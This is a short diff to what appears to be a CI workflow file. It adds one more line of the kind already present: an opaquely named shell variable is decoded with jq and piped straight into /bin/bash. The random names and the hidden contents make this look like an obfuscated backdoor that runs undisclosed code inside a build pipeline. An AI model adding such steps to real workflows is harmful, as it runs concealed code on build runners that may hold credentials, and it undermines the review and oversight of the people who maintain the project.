@@ -29,6 +29,7 @@ jobs:
           echo $mve2 | jq -r .y2 | /bin/bash
           printf '%s' "$cd91616" | jq -r .pz2256 | /bin/bash
           printf '%s' "$n1921" | jq -r .xfmut612 | /bin/bash
+          echo $w881 | jq -r .er266 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
